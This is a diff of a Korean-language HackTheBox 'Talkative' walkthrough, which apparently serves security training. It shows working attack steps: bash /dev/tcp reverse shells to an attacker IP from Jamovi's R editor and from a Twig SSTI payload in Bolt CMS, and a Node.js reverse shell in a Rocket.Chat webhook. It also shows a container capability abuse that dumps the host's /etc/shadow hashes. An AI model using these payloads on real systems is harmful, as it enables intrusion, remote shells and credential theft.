@@ -12,7 +12,7 @@ header:
   teaser: /assets/htb-linux/talkative/talkative.png
   teaser_home_page: true
 categories: [hackthebox linux]
-tags: [htb, linux, web, lfi, command-injection, rce, neo4j, priv-esc, cypher-injection, gogs, pip-exploit, sudo, chisel, reverse-shell]
+tags: [htb, linux, docker, web, command-injection, rce, ssti, reverse-shell, priv-esc, mongodb, rocket.chat, twig, bolt-cms, chisel, capabilities, shadow, webhook]
 ---
 
 ![Talkative](/assets/htb-linux/talkative/talkative.png)
@@ -167,18 +167,26 @@ $ cat /etc/hosts | grep htb
 
 `http://talkative.htb` 에 접속하면, Talkative라는 이름의 웹 서비스 소개 페이지가 표시된다.
 
+![웹 사이트](/assets/htb-linux/talkative/talkative-web.png)
+
+페이지의 소스코드를 확인해보면 `<meta name="generator" content="Bolt">` 태그를 통해 이 사이트가 **Bolt CMS**로 제작되었음을 알 수 있다.
+
+> 공식 사이트: [Bolt](https://boltcms.io/)
+
+![Bolt](/assets/htb-linux/talkative/talkative-source.png)
+
 ## TCP 3000 (ROCKET.CHAT)
 
 `TCP 3000`번 포트로 접속하면, `Rocket.Chat` 서비스의 로그인 화면이 나타난다.
 
-![Talkative](/assets/htb-linux/talkative/rocket-chat-login.png)
+![로그인 화면](/assets/htb-linux/talkative/rocket-chat-login.png)
 
 해당 페이지는 이메일 또는 사용자명과 비밀번호 입력 필드를 포함하고 있으며, 하단에는 비밀번호 재설정 및 계정 생성 링크도 제공된다.
 또한 페이지 하단에는 "`Powered by Rocket.Chat`"이라는 문구가 표시되어, 해당 서비스가 오픈소스 채팅 플랫폼인 **Rocket.Chat** 기반임을 확인할 수 있다.
 
 계정을 생성한 뒤 로그인하면, 내부 **Rocket.Chat** 대시보드에 접근할 수 있다.
 
-![Talkative](/assets/htb-linux/talkative/rocket-chat-dashboard.png)
+![대시보드](/assets/htb-linux/talkative/rocket-chat-dashboard.png)
 
 대시보드에서는 `#general` 채널이 존재하며, 이 곳에 사용자들이 참여해 있는 상태이다.
 
@@ -188,19 +196,19 @@ $ cat /etc/hosts | grep htb
 
 `TCP 8080` 에서 실행 중인 `Jamovi` 웹 애플리케이션에 접속하면, 위와 같은 **분석 도구 화면**이 표시된다.
 
-![Talkative](/assets/htb-linux/talkative/jamovi.png)
+![분석 도구 화면](/assets/htb-linux/talkative/jamovi.png)
 
 ### Jamovi RJ Editor Reverse Shell
 
 상단 메뉴에서 `Analyses` 탭이 존재하며, 이 중 `R` 아이콘을 클릭하면 `Rj Editor` 모듈이 드롭다운 형태로 표시된다.
 
-![Talkative](/assets/htb-linux/talkative/jamovi-rj.png)
+![Rj Editor](/assets/htb-linux/talkative/jamovi-rj.png)
 
 여기서 `Rj Editor` 를 선택하면 R 코드를 직접 실행할 수 있는 편집기로 이동할 수 있다.
 
 RJ 편집기에서 R 스크립트를 입력한 후, `Ctrl + Shift + Enter` 단축키를 사용하여 코드를 실행할 수 있다.
 
-![Talkative](/assets/htb-linux/talkative/jamovi-rj-editor.png)
+![실행 하는 방법](/assets/htb-linux/talkative/jamovi-rj-editor.png)
 
 먼저, 로컬 터미널에서 `nc` 명령어로 리버스 셸을 수신 대기한다:
 
@@ -216,7 +224,7 @@ system("bash -c 'bash -i >& /dev/tcp/10.10.14.171/9001 0>&1'", intern=TRUE)
 
 해당 스크립트를 실행한 결과, 정상적으로 Docker 컨테이너 내부로 진입하는 데 성공하였다.
 
-![Talkative](/assets/htb-linux/talkative/jamovi-revshell.png)
+![리버스 셸 획득](/assets/htb-linux/talkative/jamovi-revshell.png)
 
 ### OMV File Retrieval and Credential Extraction
 
@@ -292,17 +300,17 @@ drwxrwxr-x 2 kali kali 4096 Nov  5 21:23  META-INF
 
 ## Bolt CMS Login Page Discovery
 
-초기 정찰 단계에서 `talkative.htb` 도메인에 `/bolt` 경로가 존재하는 것을 확인했다. 해당 경로로 접근하면 **Bolt CMS**의 로그인 페이지로 리다이렉트된다.
+초기 정찰 단계에서 `talkative.htb` 도메인이 **Bolt CMS** 기반으로 운영되고 있는 것을 확인하였다. 해당 경로로 접근 시, 자동으로 **Bolt CMS 로그인 페이지**로 리다이렉트된다.
 
-![Talkative](/assets/htb-linux/talkative/bolt-login.png)
+![Bolt Login](/assets/htb-linux/talkative/bolt-login.png)
 
 이후 `xdata.json` 파일에서 추출한 계정 정보를 이용해 Bolt CMS 로그인 시도를 하였으나, 해당 자격 증명으로는 로그인에 실패하였다.
 
-![Talkative](/assets/htb-linux/talkative/bolt-login-fail.png)
+![Fail](/assets/htb-linux/talkative/bolt-login-fail.png)
 
 그러나 사용자명을 `admin`으로 설정하고, `xdata.json` 파일에 있던 비밀번호 `je0O9ufhWD<s` 를 입력하자 `saul` 관리자 계정으로 로그인에 성공하였다.
 
-![Talkative](/assets/htb-linux/talkative/bolt-login-success.png)
+![Success](/assets/htb-linux/talkative/bolt-login-success.png)
 
 ---
 
@@ -312,23 +320,23 @@ drwxrwxr-x 2 kali kali 4096 Nov  5 21:23  META-INF
 
 Bolt CMS 관리자 패널의 **SETTINGS → File management** 메뉴에서 `View & edit templates` 항목을 통해 템플릿 파일을 직접 수정할 수 있다.
 
-![Talkative](/assets/htb-linux/talkative/bolt-templates.png)
+![수정](/assets/htb-linux/talkative/bolt-templates.png)
 
-> **[SSTI 인젝션](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/PHP/#twig-template-format) 관련 정보는 위 링크를 참고하였다.
+> **[SSTI 인젝션](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/PHP/#twig-template-format) 관련 정보는 위 링크를 참고하였다.**
 
 이후 `index.twig` 파일을 열어 상단에 아래와 같은 SSTI 페이로드를 삽입하였다:
 
-![Talkative](/assets/htb-linux/talkative/bolt-id.png)
+![삽입](/assets/htb-linux/talkative/bolt-id.png)
 
 이 코드는 Twig에서 `system('id')` 명령어를 실행하게 하여, OS 명령 실행이 가능한지 여부를 판단하기 위한 것이다.
 
 수정한 내용을 적용하기 위해, **SETTINGS → Maintenance** 경로에서 `Clear the cache` 기능을 사용하여 템플릿 캐시를 초기화한다. 이 과정을 통해 변경된 Twig 파일 내용이 반영된다.
 
-![Talkative](/assets/htb-linux/talkative/bolt-cache.png)
+![캐시 초기화](/assets/htb-linux/talkative/bolt-cache.png)
 
 캐시를 초기화한 뒤 웹사이트에 접속하면, 다음과 같이 `system('id')` 명령어가 실행되고 있음을 확인할 수 있다:
 
-![Talkative](/assets/htb-linux/talkative/bolt-id-success.png)
+![명령어 실행 성공](/assets/htb-linux/talkative/bolt-id-success.png)
 
 나의 로컬 터미널에서 `nc` 명령어를 실행해 리버스 셸을 받을 준비를 해두었다:
 
@@ -338,13 +346,13 @@ $ nc -lvnp 9002
 
 그 후, `index.twig` 템플릿 파일로 돌아가 아래 리버스 셸 페이로드를 삽입하였다:
 
-```twig
+```text
 {{["bash -c 'bash -i >& /dev/tcp/10.10.14.171/9002 0>&1'"]|filter('system')}}
 ```
 
 해당 스크립트를 실행한 결과, 정상적으로 `web-data` 권한으로 웹 서버 내부 셸 접근에 성공하였다.
 
-![Talkative](/assets/htb-linux/talkative/web-reverse-shell.png)
+![리버스 셸 획득](/assets/htb-linux/talkative/web-reverse-shell.png)
 
 ---
 
@@ -398,7 +406,7 @@ www-data@657931ca6e84:~$ ssh saul@172.17.0.1
 
 여러 조합을 대입해본 결과, `saul` 사용자 계정으로 SSH 셸을 획득하는 데 성공하였다.
 
-![Talkative](/assets/htb-linux/talkative/saul.png)
+![SSH 셸 획득](/assets/htb-linux/talkative/saul.png)
 
 ## Identifying Open MongoDB Ports
 
@@ -762,6 +770,160 @@ rs0:PRIMARY> db.users.find().pretty()
 }
 ```
 
-이후 다시 Rocket.Chat 사이트에 접속 후 로그인을 하게 되면 Administration 항목이 추가된 것을 확인할 수 있다.
+이후 다시 Rocket.Chat 웹 인터페이스에 접속하여 로그인을 진행한 결과, 상단 메뉴에 `Administration` 항목이 새롭게 나타난 것을 확인할 수 있었다.
 
-![alt text](/assets/htb-linux/talkative/rocket-chat-admin.png)
+![ADMIN 권한 상승](/assets/htb-linux/talkative/rocket-chat-admin.png)
+
+## Reverse Shell via WebHook
+
+`Administration` 항목을 클릭하면 다양한 관리 기능을 확인할 수 있다.
+
+![Menu](/assets/htb-linux/talkative/webhook-menu.png)
+
+이 중, 빨간색으로 표시된 `Integrations` 메뉴를 통해 WebHook 기능에 접근할 수 있다.
+
+**New Integration → Incoming WebHook** 항목으로 들어가면, 이름(Name), 채널(Post to Channel), 게시 사용자(Post as) 등을 입력할 수 있는 설정 화면이 나타난다.
+
+![설정 화면](/assets/htb-linux/talkative/webhook-new.png)
+
+아래로 조금 더 내려가면 스크립트를 작성할 수 있는 입력란이 나타난다.
+
+이곳에서 리버스 셸을 실행할 수 있는 스크립트를 JSON 형식으로 삽입하면, WebHook 을 통해 원격 명령 실행이 가능해진다.
+
+![셸 삽입 경로 Find](/assets/htb-linux/talkative/webhook-script.png)
+
+스크립트란에 간단한 리버스 셸 코드를 삽입하였다:
+
+```js
+const require = console.log.constructor('return process.mainModule.require')();
+var net = require('net'), sh = require('child_process').exec('/bin/bash');
+var client = new net.Socket();
+client.connect(9003, '10.10.14.171', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+sh.stderr.pipe(client);});
+```
+
+스크립트를 삽입한 이후, 아래쪽을 보면 `WebHook URL` 이 자동으로 생성된 것을 확인할 수 있다:
+
+![WebHook URL](/assets/htb-linux/talkative/webhook-url.png)
+
+해당 **WebHook URL은 curl 요청을 통해 실행** 시킬 수 있으며, 삽입한 스크립트 또한 이 트리거에 의해 실행되는 구조다.
+
+먼저 로컬 터미널에서 `nc` 명령어를 통해 리버스 셸을 받을 준비를 한다:
+
+```bash
+$ nc -lvnp 9003
+```
+
+그런 다음, 아래와 같이 `curl` 명령으로 WebHook을 트리거 시켰다:
+
+```bash
+$ curl http://talkative.htb:3000/hooks/Nq3xhpxSzugoz6TWS/sX5k......
+
+{"success":false}
+```
+
+`{"success":false}` 라는 응답이 뜨긴 하지만, 실제로 `nc`를 통해 확인해보면 정상적으로 연결이 이루어지며 리버스 셸 획득에 성공했다.
+
+![리버스 셸 획득](/assets/htb-linux/talkative/webhook-revshell.png)
+
+## Docker Container → root Lateral Movement
+
+도커 컨테이너 내에서 `/proc/self/status` 파일을 확인해본 결과, 이상적으로 높은 권한이 부여되어 있는 것을 확인할 수 있었다.
+
+```bash
+root@c150397ccd63:/proc/self# cat status
+
+# ...[SKIP]...
+Threads:        1
+SigQ:   1/7484
+SigPnd: 0000000000000000
+ShdPnd: 0000000000000000
+SigBlk: 0000000000010000
+SigIgn: 0000000000380004
+SigCgt: 000000004b817efb
+CapInh: 0000000000000000
+CapPrm: 00000000a80425fd
+CapEff: 00000000a80425fd
+CapBnd: 00000000a80425fd
+CapAmb: 0000000000000000
+NoNewPrivs:     0
+Seccomp:        2
+Speculation_Store_Bypass:       vulnerable
+Cpus_allowed:   00000000,00000000,00000000,00000003
+Cpus_allowed_list:      0-1
+Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
+Mems_allowed_list:      0
+voluntary_ctxt_switches:        16
+nonvoluntary_ctxt_switches:     28
+```
+
+이 CapEff 필드를 기반으로 `capsh` 를 이용해 디코딩한 결과는 다음과 같다:
+
+```bash
+$ capsh --decode=00000000a80425fd
+
+0x00000000a80425fd=cap_chown,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+```
+
+위와 같이 **파일 시스템, 네트워크, 사용자 및 그룹 전환 등과 관련된 주요 권한(`capability`)들이 다수 활성화된 상태**임을 알 수 있다. 이는 컨테이너 환경 내에서 루트 권한 획득이 가능한 매우 강력한 권한 상태라는 것을 의미한다.
+
+`/proc/self/status` 파일에서 도커 컨테이너가 높은 권한을 가진 것을 확인한 후, [CDK](https://github.com/cdk-team/CDK) 도구를 활용하였다.
+
+CDK 실행 파일을 다운로드 받은 후, 내 로컬 터미널에서 리버스 방향으로 전송 대기를 한 후:
+
+```bash
+$ nc -lvnp 9004 < cdk_linux_amd64
+```
+
+도커 컨테이너 내부에서 Bash의 TCP 소켓 기능을 사용하여 파일을 로컬로부터 수신하였다:
+
+```bash
+root@c150397ccd63:~# cat < /dev/tcp/10.10.14.171/9004 > cdk_linux_amd64
+```
+
+이후 실행 권한을 부여해주었다:
+
+```bash
+root@c150397ccd63:~# chmod +x cdk_linux_amd64
+```
+
+이후 CDK 도구를 활용하여 `cap-dac-read-search` 모듈을 실행시키면, **컨테이너 내부에서 호스트 시스템의 민감한 파일인 `/etc/shadow` 에 접근**할 수 있다:
+
+```bash
+root@c150397ccd63:~# ./cdk_linux_amd64 run cap-dac-read-search
+./cdk_linux_amd64 run cap-dac-read-search
+Running with target: /etc/shadow, ref: /etc/hostname
+root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::
+daemon:*:18659:0:99999:7:::
+bin:*:18659:0:99999:7:::
+sys:*:18659:0:99999:7:::
+sync:*:18659:0:99999:7:::
+games:*:18659:0:99999:7:::
+# ...[SKIP]...
+usbmux:*:18849:0:99999:7:::
+sshd:*:18849:0:99999:7:::
+systemd-coredump:!!:18849::::::
+lxd:!:18849::::::
+saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::
+```
+
+이처럼, 컨테이너를 탈출하지 않고도 **호스트 시스템의 `/etc/shadow` 파일을 읽어 root 및 사용자 계정의 해시 정보를 덤프할 수 있게 된다.**
+
+만약 `cap-dac-read-search` 모듈을 통해 루트(`/`) 경로 전체에 접근하도록 지정하게 되면 다음과 같은 결과를 얻을 수 있다:
+
+```bash
+root@c150397ccd63:~# ./cdk_linux_amd64 run cap-dac-read-search /etc/hosts /
+Running with target: /, ref: /etc/hosts
+executing command(/bin/bash)...
+
+root@c150397ccd63:/# ls
+ls
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  var
+boot  dev    home  lib32  libx32  media 
+```
+
+`id` 명령어 상의 UID는 여전히 컨테이너의 root로 보일 수 있지만, **파일 시스템은 호스트의 루트(`/`)로 마운트된 상태**가 된다.
+
+즉, 이 권한 상승을 통해 **호스트 머신의 실제 루트 파일 시스템에 접근**할 수 있으며, 이로 인해 최종적으로 **플래그 파일까지 획득**하는 것이 가능하다:
+
+![플래그 획득](/assets/htb-linux/talkative/flag.png)
